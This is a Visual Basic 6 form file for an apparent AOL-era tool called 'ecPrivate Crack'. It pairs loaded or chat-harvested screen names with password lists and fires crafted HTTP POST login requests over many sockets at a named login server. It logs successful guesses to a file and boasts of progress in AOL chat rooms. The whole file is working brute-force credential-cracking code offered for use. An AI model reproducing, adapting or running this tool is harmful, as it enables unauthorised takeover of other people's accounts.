VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "ecPrivate Crack"
   ClientHeight    =   4020
   ClientLeft      =   5160
   ClientTop       =   3645
   ClientWidth     =   5460
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4020
   ScaleWidth      =   5460
   Begin VB.Timer tmrRps 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   960
      Top             =   3960
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Command2"
      Height          =   495
      Left            =   7440
      TabIndex        =   40
      Top             =   4200
      Width           =   615
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   855
      Left            =   8280
      TabIndex        =   39
      Top             =   2640
      Width           =   1095
   End
   Begin VB.Timer tmrCrack 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   1440
      Top             =   3960
   End
   Begin VB.Timer tmrRate 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   9480
      Top             =   480
   End
   Begin VB.TextBox txtNo 
      Height          =   285
      Left            =   5880
      TabIndex        =   33
      Text            =   "DrnBd"
      Top             =   480
      Width           =   2055
   End
   Begin VB.PictureBox picGif 
      Height          =   300
      Left            =   120
      ScaleHeight     =   240
      ScaleWidth      =   5115
      TabIndex        =   30
      Top             =   3370
      Width           =   5175
      Begin VB.Label lblCurrent 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00D6A58B&
         BackStyle       =   0  'Transparent
         Caption         =   ":"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   300
         Left            =   0
         TabIndex        =   31
         Top             =   0
         Width           =   5175
      End
   End
   Begin VB.ListBox lstCollect 
      Height          =   1035
      Left            =   8040
      TabIndex        =   27
      Top             =   480
      Width           =   1095
   End
   Begin MSComDlg.CommonDialog Cdmgl 
      Left            =   7080
      Top             =   960
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.StatusBar Stts 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   18
      Top             =   3765
      Width           =   5460
      _ExtentX        =   9631
      _ExtentY        =   450
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   4
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Text            =   "TT: 0"
            TextSave        =   "TT: 0"
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Text            =   "RPS:0"
            TextSave        =   "RPS:0"
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Text            =   "RPM:0"
            TextSave        =   "RPM:0"
         EndProperty
         BeginProperty Panel4 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Style           =   5
            Object.Width           =   1629
            MinWidth        =   1629
            TextSave        =   "2:11 AM"
         EndProperty
      EndProperty
   End
   Begin VB.Frame frmCrack 
      Caption         =   "Cracks (0)"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1020
      Left            =   120
      TabIndex        =   14
      Top             =   2320
      Width           =   5175
      Begin VB.PictureBox Picture3 
         Height          =   320
         Left            =   120
         ScaleHeight     =   255
         ScaleWidth      =   735
         TabIndex        =   16
         Top             =   600
         Width           =   795
         Begin VB.CommandButton cmdCreackja 
            Caption         =   "Save"
            Height          =   255
            Left            =   0
            TabIndex        =   17
            Top             =   0
            Width           =   735
         End
      End
      Begin VB.ComboBox cmbCrack 
         Height          =   315
         Left            =   120
         Style           =   2  'Dropdown List
         TabIndex        =   15
         Top             =   240
         Width           =   4935
      End
   End
   Begin VB.Frame Frame2 
      Caption         =   "Settings"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   730
      Left            =   120
      TabIndex        =   13
      Top             =   1560
      Width           =   5175
      Begin VB.TextBox txtHandle 
         Height          =   285
         Left            =   3120
         TabIndex        =   36
         Top             =   270
         Width           =   1935
      End
      Begin VB.PictureBox Picture4 
         Height          =   390
         Left            =   120
         ScaleHeight     =   330
         ScaleWidth      =   1935
         TabIndex        =   19
         Top             =   240
         Width           =   2000
         Begin VB.CommandButton cmdClean 
            Caption         =   "Clean"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   330
            Left            =   960
            TabIndex        =   21
            Top             =   0
            Width           =   975
         End
         Begin VB.CommandButton cmdStart 
            Caption         =   "Start"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   330
            Left            =   0
            TabIndex        =   20
            Top             =   0
            Width           =   975
         End
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "Handle:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   2400
         TabIndex        =   37
         Top             =   300
         Width           =   615
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Screen name && Passwords"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1330
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   5175
      Begin MSComctlLib.ProgressBar PrgSN 
         Height          =   255
         Left            =   120
         TabIndex        =   28
         Top             =   960
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         _Version        =   393216
         Appearance      =   1
         Scrolling       =   1
      End
      Begin VB.PictureBox Picture2 
         Height          =   320
         Left            =   2640
         ScaleHeight     =   255
         ScaleWidth      =   2355
         TabIndex        =   4
         Top             =   600
         Width           =   2415
         Begin VB.CommandButton cmdSave3 
            Caption         =   "Save"
            Height          =   255
            Left            =   1680
            TabIndex        =   12
            Top             =   0
            Width           =   670
         End
         Begin VB.CommandButton cmdLoad3 
            Caption         =   "Load"
            Height          =   255
            Left            =   960
            TabIndex        =   11
            Top             =   0
            Width           =   735
         End
         Begin VB.CommandButton cmdClear2 
            Caption         =   "-"
            Height          =   255
            Left            =   480
            TabIndex        =   10
            Top             =   0
            Width           =   495
         End
         Begin VB.CommandButton cmdLoad2 
            Caption         =   "+"
            Height          =   255
            Left            =   0
            TabIndex        =   9
            Top             =   0
            Width           =   495
         End
      End
      Begin VB.PictureBox Picture1 
         Height          =   320
         Left            =   120
         ScaleHeight     =   255
         ScaleWidth      =   2355
         TabIndex        =   3
         Top             =   600
         Width           =   2415
         Begin VB.CommandButton cmdSaveNames 
            Caption         =   "Save"
            Height          =   255
            Left            =   1680
            TabIndex        =   8
            Top             =   0
            Width           =   670
         End
         Begin VB.CommandButton cmdLoad 
            Caption         =   "Load"
            Height          =   255
            Left            =   960
            TabIndex        =   7
            Top             =   0
            Width           =   735
         End
         Begin VB.CommandButton cmdClear 
            Caption         =   "-"
            Height          =   255
            Left            =   480
            TabIndex        =   6
            Top             =   0
            Width           =   495
         End
         Begin VB.CommandButton cmdAdd 
            BackColor       =   &H00B08883&
            Caption         =   "+"
            Height          =   255
            Left            =   0
            TabIndex        =   5
            Top             =   0
            Width           =   495
         End
      End
      Begin VB.ComboBox cmbPasswords 
         Height          =   315
         Left            =   2640
         Style           =   2  'Dropdown List
         TabIndex        =   2
         Top             =   240
         Width           =   2415
      End
      Begin VB.ComboBox cmbNames 
         Height          =   315
         Left            =   120
         Style           =   2  'Dropdown List
         TabIndex        =   1
         Top             =   240
         Width           =   2415
      End
      Begin MSComctlLib.ProgressBar PrgPW 
         Height          =   255
         Left            =   2640
         TabIndex        =   29
         Top             =   960
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   450
         _Version        =   393216
         Appearance      =   1
         Scrolling       =   1
      End
   End
   Begin MSWinsockLib.Winsock sckCrack 
      Index           =   0
      Left            =   7680
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblLastRPM 
      Caption         =   "0"
      Height          =   255
      Left            =   6000
      TabIndex        =   38
      Top             =   3120
      Width           =   1935
   End
   Begin VB.Label lblMin 
      Caption         =   "0"
      Height          =   255
      Left            =   9840
      TabIndex        =   35
      Top             =   1560
      Width           =   1455
   End
   Begin VB.Label lblSec 
      Caption         =   "0"
      Height          =   255
      Left            =   9840
      TabIndex        =   34
      Top             =   1320
      Width           =   1455
   End
   Begin VB.Label lblSess 
      Caption         =   "0"
      Height          =   255
      Left            =   6000
      TabIndex        =   32
      Top             =   2760
      Width           =   1815
   End
   Begin VB.Label Label1 
      Caption         =   "0"
      Height          =   255
      Left            =   5880
      TabIndex        =   26
      Top             =   3720
      Width           =   1455
   End
   Begin VB.Label lblTries 
      Caption         =   "0"
      Height          =   255
      Left            =   6000
      TabIndex        =   25
      Top             =   3480
      Width           =   2295
   End
   Begin VB.Label lblCount3 
      BackColor       =   &H000000C0&
      Caption         =   "0"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   6000
      TabIndex        =   24
      Top             =   2280
      Width           =   1815
   End
   Begin VB.Label lblCount2 
      Caption         =   "0"
      Height          =   255
      Left            =   6000
      TabIndex        =   23
      Top             =   2040
      Width           =   1815
   End
   Begin VB.Label lblCount 
      Caption         =   "0"
      Height          =   255
      Left            =   6000
      TabIndex        =   22
      Top             =   1320
      Width           =   1815
   End
   Begin VB.Menu mnufile 
      Caption         =   "SN Extra"
      Begin VB.Menu mnuadd 
         Caption         =   "Add Current AOL Chat room"
      End
      Begin VB.Menu mnucuur 
         Caption         =   "Add Current AIM Chat room"
      End
   End
   Begin VB.Menu mnuset 
      Caption         =   "Settings"
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim strData As String
Dim lngRpm As Long
Dim tmpName(5000) As String
Dim PackData(5000) As String
Dim Params() As String
Dim lngRate As Long
  Dim tmpSetting() As String, tmpData As String



Sub SocketsStop()
On Error Resume Next
   cmdStart.Caption = "Start"
   PrgPW.Value = 0
   PrgSN.Value = 0
   lblCount2 = 0
   lblCount3 = 0
   cmbPasswords.Enabled = True
   cmbNames.Enabled = True
  
      lngRate = lblCount / cmbPasswords.ListCount * 60
      Stts.Panels(3).Text = "RPM:" & Format(lngRate, "##")
      
      
       For i = 0 To sckCrack.UBound
          sckCrack(i).Close
          Unload sckCrack(i)
         Next i
      MsgBox "Socket Limited Reached, Sockets where cleaned" & vbCrLf & "Restart Cracker", vbApplicationModal
End Sub
Private Sub cmdAdd_Click()
 Dim aa As String, tmpChk As String
 
 Do
Skip:
   aa = InputBox("Enter Screen Names", "Add Screen Names")
   tmpChk = LCase(Replace(aa, " ", vbNullString))
   
  For i = 0 To cmbNames.ListCount - 1
 
    If cmbNames.List(i) = tmpChk Then
     GoTo Skip:
    End If
  Next i
  
        If Len(tmpChk) > 0 Then
           cmbNames.AddItem tmpChk
        End If
 
 Loop Until aa = vbNullString
 
 If cmbNames.ListCount > 0 Then: cmbNames.ListIndex = 0
End Sub

Private Sub cmdClean_Click()
 On Error Resume Next
 For i = 0 To sckCrack.UBound
     sckCrack(i).Close
     Unload sckCrack(i)
  Next i
End Sub

Private Sub cmdCreackja_Click()
 Dim fd As Long
 
 If cmbCrack.ListCount > 0 Then
  fd = FreeFile
  Open App.Path & "\Cracks.txt" For Append As #fd
   For i = 0 To cmbCrack.ListCount - 1
    Print #fd, cmbCrack.List(i)
   Next i
   Close #fd
  Else
  MsgBox "Nothing to save", vbExclamation
End If
 
End Sub



Private Sub cmdLoad2_Click()
Dim aa As String, tmpChk As String
 
 Do
Skip:
   aa = InputBox("Enter a Password", "Add Passwords")
   tmpChk = LCase(Replace(aa, " ", vbNullString))
   
  For i = 0 To cmbPasswords.ListCount - 1
 
    If cmbPasswords.List(i) = tmpChk Then
     GoTo Skip:
    End If
  Next i
  
        If Len(tmpChk) > 0 Then
           cmbPasswords.AddItem tmpChk
        End If
 
 Loop Until aa = vbNullString
 
 If cmbPasswords.ListCount > 0 Then: cmbPasswords.ListIndex = 0
End Sub

Private Sub cmdSave3_Click()
On Error Resume Next
Dim tmpFilePath As String
Dim j As Long

     Cdmgl.Filter = "Txt and Lst files (*.txt,*.lst)|*.txt;*.lst||"
     Cdmgl.DialogTitle = "Save Passwords"
     Cdmgl.CancelError = False
     Cdmgl.FileName = "Passwords.txt"
     Cdmgl.ShowSave
     tmpFilePath = Cdmgl.FileTitle
     
     If tmpFilePath <> "" Then
     
     j = FreeFile
     Open tmpFilePath For Output As #j
       For i = 0 To cmbPasswords.ListCount - 1
        Print #j, cmbPasswords.List(i)
       Next i
       Close #j
       
     
     End If
End Sub

Private Sub cmdSaveNames_Click()
On Error Resume Next
Dim tmpFilePath As String
Dim j As Long

     Cdmgl.Filter = "Txt and Lst files (*.txt,*.lst)|*.txt;*.lst||"
     Cdmgl.DialogTitle = "Save Screen Names"
     Cdmgl.CancelError = False
     Cdmgl.FileName = "Screennames.txt"
     Cdmgl.ShowSave
     tmpFilePath = Cdmgl.FileTitle
     
     If tmpFilePath <> "" Then
     
     j = FreeFile
     Open tmpFilePath For Output As #j
       For i = 0 To cmbNames.ListCount - 1
        Print #j, cmbNames.List(i)
       Next i
       Close #j
       
     
     End If

End Sub

Private Sub Command1_Click()
'On Error Resume Next

PlaySound

   
End Sub

Private Sub Command2_Click()
Debug.Print GetUSer
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
 Dim Result As Long
    Dim msg As Long
    'The value of X will vary depending upon
    '     the scalemode setting


    If Me.ScaleMode = vbPixels Then
        msg = X
    Else
        msg = X / Screen.TwipsPerPixelX
    End If


    Select Case msg
        Case WM_LBUTTONUP '514 restore form window
            Me.WindowState = vbNormal
            Result = SetForegroundWindow(Me.hwnd)
            Me.Show
            Shell_NotifyIcon NIM_DELETE, nid
        Case WM_LBUTTONDBLCLK '515 restore form window
            Me.WindowState = vbNormal
            Result = SetForegroundWindow(Me.hwnd)
            Me.Show
            Shell_NotifyIcon NIM_DELETE, nid
        Case WM_RBUTTONUP '517 display popup menu
            Me.WindowState = vbNormal
            Result = SetForegroundWindow(Me.hwnd)
            Me.Show
            Shell_NotifyIcon NIM_DELETE, nid
    End Select
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)

Call SaveSetting("cracker", "settings", "handle", txtHandle.Text)

Shell_NotifyIcon NIM_DELETE, nid
End
End Sub

Private Sub Form_Resize()
If Me.WindowState = vbMinimized Then
    Me.Hide
    Shell_NotifyIcon NIM_ADD, nid
End If
End Sub

Private Sub mnuadd_Click()

Dim tmpAsw As String


 If frmSettings.ChkSettings(1).Value = 1 Then
 If cmbNames.ListCount > 0 Then
     tmpAsw = MsgBox("You have names already in this list, do you want to append or clear?", vbYesNo, "Add Room")

   Select Case tmpAsw
       
       Case vbYes
       
        Call AOL_GetChatList(AOLList, lstCollect, False)
         For i = 0 To lstCollect.ListCount - 1
           cmbNames.AddItem lstCollect.List(i)
         Next i
        lstCollect.Clear
        
       Case vbNo
       cmbNames.Clear
        Call AOL_GetChatList(AOLList, lstCollect, False)
         For i = 0 To lstCollect.ListCount - 1
           cmbNames.AddItem lstCollect.List(i)
         Next i
        lstCollect.Clear
      End Select
      If cmbNames.ListCount > 0 Then cmbNames.ListIndex = 0
      
      
      Else
      
      Call AOL_GetChatList(AOLList, lstCollect, False)
         For i = 0 To lstCollect.ListCount - 1
           cmbNames.AddItem lstCollect.List(i)
         Next i
        lstCollect.Clear
        If cmbNames.ListCount > 0 Then cmbNames.ListIndex = 0
    End If
   
   
   Else
       lstCollect.Clear
       cmbNames.Clear
       Call AOL_GetChatList(AOLList, lstCollect, False)
         For i = 0 To lstCollect.ListCount - 1
           cmbNames.AddItem lstCollect.List(i)
         Next i
        lstCollect.Clear
        If cmbNames.ListCount > 0 Then cmbNames.ListIndex = 0
        
   
   End If
   
   Debug.Print cmbNames.ListCount
End Sub

Private Sub mnuset_Click()
frmSettings.Show 0, Me
End Sub

Private Sub sckCrack_Connect(Index As Integer)
If Len(PostData) <> 0 Then
   Call sckCrack(Index).SendData(PostData)
End If
End Sub
Function PostData()
On Error Resume Next
 Dim tmpQuery As String
 Params = Split(tmpName(lblCount), ":", 2, vbTextCompare)
 

  tmpQuery = "username=" & Params(0) & "&pass=" & Params(1) & "&submit=Submit+Query"
  
PostData = PostData & "POST /login.php HTTP/1.1" & vbCrLf
PostData = PostData & "Host: tradeserver.ueuo.com" & vbCrLf
PostData = PostData & "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3" & vbCrLf
PostData = PostData & "Accept: */*" & vbCrLf
PostData = PostData & "Keep-Alive: 300" & vbCrLf
PostData = PostData & "Connection: keep -alive" & vbCrLf
PostData = PostData & "Content-Length: " & Len(tmpQuery) & vbCrLf
PostData = PostData & vbCrLf
PostData = PostData & tmpQuery & vbCrLf


End Function

Private Sub cmdClear_Click()
 cmbNames.Clear
End Sub

Private Sub cmdClear2_Click()
 cmbPasswords.Clear
End Sub

Private Sub cmdLoad_Click()
On Error Resume Next
Dim tmpFilePath As String, f As Long, tmpData As String
      Dim i As Integer
     
     Cdmgl.Filter = "Text Files (*.txt,*.lst)|*.txt;*.lst||"
     Cdmgl.DialogTitle = "Load Screen Names"
     Cdmgl.CancelError = False
     Cdmgl.ShowOpen
     tmpFilePath = Cdmgl.FileName
      
       If tmpFilePath <> vbNullString Then
        f = FreeFile
        Open tmpFilePath For Input As #f
         i = 0
              
              Do Until EOF(1)
              Line Input #f, tmpData

                 cmbNames.AddItem tmpData, i
               
              i = i + 1
          Loop
          Close #f
       End If
       
     If cmbNames.ListCount > 0 Then: cmbNames.ListIndex = 0
       
End Sub

Private Sub cmdLoad3_Click()
On Error Resume Next
Dim tmpFilePath As String, f As Long, tmpData As String
      Dim i As Integer
     
     Cdmgl.Filter = "Text Files (*.txt,*.lst)|*.txt;*.lst||"
     Cdmgl.DialogTitle = "Load Screen Names"
     Cdmgl.CancelError = False
     Cdmgl.ShowOpen
     tmpFilePath = Cdmgl.FileName
      
       If tmpFilePath <> vbNullString Then
        f = FreeFile
        Open tmpFilePath For Input As #f
         i = 0
              
              Do Until EOF(1)
              Line Input #f, tmpData

                 cmbPasswords.AddItem tmpData, i
               
              i = i + 1
          Loop
          Close #f
       End If
       
     If cmbPasswords.ListCount > 0 Then: cmbPasswords.ListIndex = 0
End Sub

Private Sub cmdStart_Click()
If cmbNames.ListCount > 0 And cmbPasswords.ListCount > 0 Then
 If cmdStart.Caption = "Start" Then
    cmdStart.Caption = "Stop"
    cmbNames.Enabled = False
    cmbPasswords.Enabled = False
    
    lblSess = lblSess + 1
    tmrRate.Enabled = True
    tmrRps.Enabled = True
    tmrCrack.Enabled = True
    
   If frmSettings.ChkSettings(2).Value = 1 Then
   Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>C</b>racking started: " & Format(Time, "HH:MM:SS") & " » " & Format(Date, "MM.DD.YY"))
   Delay 0.4
   Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>P</b>asswords: " & cmbPasswords.ListCount & " »  <b>S</b>creen names: " & cmbNames.ListCount)
   Delay 0.4
   Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>C</b>racks: " & cmbCrack.ListCount)
   End If
 


    Else
    tmrCrack.Enabled = False
    cmdStart.Caption = "Start"
    tmrRate.Enabled = False
    tmrRps.Enabled = False
    cmbPasswords.Enabled = True
    cmbNames.Enabled = True

End If
     Else
     MsgBox "Nothing loaded", vbExclamation
End If

End Sub



Private Sub Form_Load()
On Error Resume Next
lngSocket = 0
 MakeFlat PrgPW.hwnd
 MakeFlat PrgSN.hwnd
 txtNo.Text = GetUSer
Change_pb_ForeColor PrgSN.hwnd, 13996134
Change_pb_ForeColor PrgPW.hwnd, 13996134
 Dim success%
 
 success% = SetWindowPos(Me.hwnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)
 

If Dir(App.Path & "\settings") <> vbnulllstring Then

Open App.Path & "\settings" For Input As #1
   
   tmpData = Input(LOF(1), #1)
   tmpSetting = Split(tmpData, vbCrLf)
   
   For i = 0 To UBound(tmpSetting)
   frmSettings.ChkSettings(i).Value = tmpSetting(i)
   Next i
   
 Close #1
 
 End If
 
  txtColor.Text = GetSetting("cracker", "settings", "color", "#C0C0C0")
  txtHandle.Text = GetSetting("cracker", "settings", "handle", sckCrack(0).LocalHostName)
  
  
  
  If frmSettings.ChkSettings(3).Value = 1 Then
  If Dir(App.Path & "\Cracks.txt") <> vbnulllstring Then
   Dim fd As Long
   fd = FreeFile
    Open App.Path & "\Cracks.txt" For Input As #fd
         i = 0
              Do Until EOF(fd)
              Line Input #fd, tmpData

                   cmbCrack.AddItem tmpData, i
                  
              i = i + 1
          Loop
          Close #fd
  End If
  frmCrack.Caption = "Cracks (" & cmbCrack.ListCount & ")"
  If cmbCrack.ListCount > 0 Then cmbCrack.ListIndex = 0
  End If
  
  
 If frmSettings.ChkSettings(2).Value = 1 Then
   Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>ec</b>Private <b>C</b>racker loaded: " & Format(Time, "HH:MM:SS") & " » " & Format(Date, "MM.DD.YY"))
   Delay 0.6
   Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>C</b>racks: " & cmbCrack.ListCount)
 End If
  
  For i = 1 To 4
   frmSettings.CmbTime.AddItem i
  Next i
  frmSettings.CmbTime.ListIndex = CInt(GetSetting("cracker", "settings", "time", 1))


  
   With nid
        .cbSize = Len(nid)
        .hwnd = Me.hwnd
        .uId = vbNull
        .uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
        .uCallBackMessage = WM_MOUSEMOVE
        .hIcon = Me.Icon
        .szTip = " ecPrivate Cracker " & vbNullChar
    End With
  
End Sub
Function CrackExist(User As String) As Boolean
 For i = 0 To cmbCrack.ListCount - 1
   If cmbCrack.List(i) = User Then
     CrackExist = True
     Exit Function
   End If
 Next i
 CrackExist = False
End Function

Private Sub sckCrack_DataArrival(Index As Integer, ByVal bytesTotal As Long)
  On Error Resume Next
  sckCrack(Index).GetData PackData(Index), vbString


   If InStrB(PackData(Index), "http://fotoslatino.aol.com/_cqr/login?sitedomain=pictures.aol.com") Then
      cmbCrack.AddItem tmpName(Index)
      cmbCrack.ListIndex = cmbCrack.ListCount - 1
      frmCrack.Caption = "Cracks (" & cmbCrack.ListCount & ")"
      
      If (frmSettings.ChkSettings(0).Value And frmSettings.ChkSettings(2).Value) = 1 Then
         Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>N</b>ew <b>C</b>racks: " & cmbCrack.ListCount & " » <b>T</b>ime: " & Format(Time, "HH:MM:SS"))
         
         If frmSettings.ChkSettings(4).Value = 1 Then
           PlaySound
         End If
         
      End If
      
    End If

    Debug.Print PackData(Index)
    
    lblTries = lblTries + 1
    Stts.Panels(1).Text = "TT:" & lblTries
    

     
End Sub

Private Sub tmrCrack_Timer()
On Error Resume Next
 
 
 
 
    If Val(lblCount2) >= cmbPasswords.ListCount Then
       lblCount2 = 0
       lblCount3 = lblCount3 + 1
    End If
    
            If Val(lblCount) >= 4000 Then
              SocketsStop
               Exit Sub
            End If
            

    lblCount = lblCount + 1
    lblCount2 = lblCount2 + 1
    
    
    Load sckCrack(lblCount)
    sckCrack(lblCount).Close
    sckCrack(lblCount).Connect "tradeserver.ueuo.com", 80
    
    tmpName(lblCount) = cmbNames.List(lblCount3) & ":" & cmbPasswords.List(lblCount2 - 1)
    lblCurrent = tmpName(lblCount)
    
   '/* Progress Bars
    PrgSN.Value = Int(lblCount3 / cmbNames.ListCount * 100)
    PrgPW.Value = Int(lblCount2 / cmbPasswords.ListCount * 100)
   '/
   
    
    cmbNames.ListIndex = lblCount3
    cmbPasswords.ListIndex = lblCount2
    
        
      lngRpm = lngRpm + 1
 
      lngRate = Int(lblCount / cmbPasswords.ListCount * 60)
      Stts.Panels(3).Text = "RPM:" & Format(lngRate, "##")
      
   Pause 0.07

DoEvents

'/////////////////////////////

If Val(lblCount3) >= cmbNames.ListCount Then


   
  If lngRate > lblLastRPM Then lblLastRPM = Format(lngRate, "##")
  
     lblCount = 0
                If frmSettings.ChkSettings(2).Value = 1 Then
                Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>C</b>racking stopped: " & Format(Time, "HH:MM:SS") & " » " & Format(Date, "MM.DD.YY"))
                Delay 0.6
                Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>P</b>asswords: " & cmbPasswords.ListCount & " »  <b>S</b>creen names: " & cmbNames.ListCount)
                Delay 0.6
                Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>C</b>racks: " & cmbCrack.ListCount)
                Delay 0.6
                Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>R</b>PM's: " & Format(lngRate, "##") & " » <b>T</b>otal <b>T</b>ries: " & lblTries & " » <b>S</b>essions: " & lblSess)
                End If
   
  DoEvents
   
   Reset
    ' tmrRps.Enabled = False
     tmrCrack.Enabled = False
End If


End Sub
Sub Reset()
On Error Resume Next


  DoEvents
    cmdStart.Caption = "Start"
    PrgPW.Value = 0
    PrgSN.Value = 0
    lblCount2 = 0
    lblCount3 = 0
    lblTries = 0
    cmbNames.ListIndex = 0
    cmbPasswords.ListIndex = 0
    cmbPasswords.Enabled = True
    cmbNames.Enabled = True
    tmrRate.Enabled = False
 
        For i = 0 To sckCrack.UBound
         sckCrack(i).Close
        Next i
End Sub
Private Sub tmrRate_Timer()
 If lblSec = 60 Then
    lblSec = 0
    lblMin = lblMin + 1
 End If
 
 lblSec = lblSec + 1
 
  If lblMin = frmSettings.CmbTime.Text Then
        Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>" & Left(txtHandle, 1) & "</b>" & Mid(txtHandle, 2) & " » is <b>C</b>racking » RPM's: " & Format(lngRate, "##") & " » Cracks [" & cmbCrack.ListCount & "]")
        Delay 0.5
         If lblLastRPM > 0 Then
          Call AOL9_ChatSend("<font face=Tahoma color=" & frmSettings.txtColor & "><b>F</b>astest RPM: " & lblLastRPM)
         End If
        
  lblMin = 0
  End If

End Sub

Private Sub tmrRps_Timer()
   '  lngRpm = lngRpm + 1
     Stts.Panels(2).Text = "RPS:" & Format(lngRpm, "#.##")
     lngRpm = 0
End Sub
